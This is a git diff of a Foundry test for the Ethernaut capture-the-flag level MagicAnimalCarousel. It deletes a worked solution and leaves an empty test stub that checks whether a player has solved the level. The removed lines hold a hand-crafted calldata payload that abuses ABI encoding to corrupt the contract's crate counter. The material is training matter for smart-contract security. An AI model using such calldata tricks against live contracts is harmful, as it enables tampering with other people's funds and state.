@@ -20,6 +20,12 @@ contract TestMagicAnimalCarousel is Test, Utils {
                                  HELPERS
     //////////////////////////////////////////////////////////////*/
 
+    modifier checkSolvedByPlayer() {
+        vm.startPrank(player, player);
+        _;
+        assertTrue(submitLevelInstance(ethernaut, address(instance)));
+    }
+
     function setUp() public {
         address payable[] memory users = createUsers(2);
 
@@ -106,14 +112,7 @@ contract TestMagicAnimalCarousel is Test, Utils {
     }
 
     /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player, player);
-        instance.setAnimalAndSpin("Echidna");
-        bytes memory payload = abi.encodePacked(uint256(64), uint256(1), uint256(12), hex"31323334353637383930ffff");
-        (bool success, ) = address(instance).call(abi.encodePacked(instance.changeAnimal.selector, payload));
-        assertTrue(success);
-        instance.setAnimalAndSpin("Pidgeon");
-        assertEq(instance.currentCrateId(), type(uint16).max);
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
+    function testSolve() public checkSolvedByPlayer{
+
     }
 }
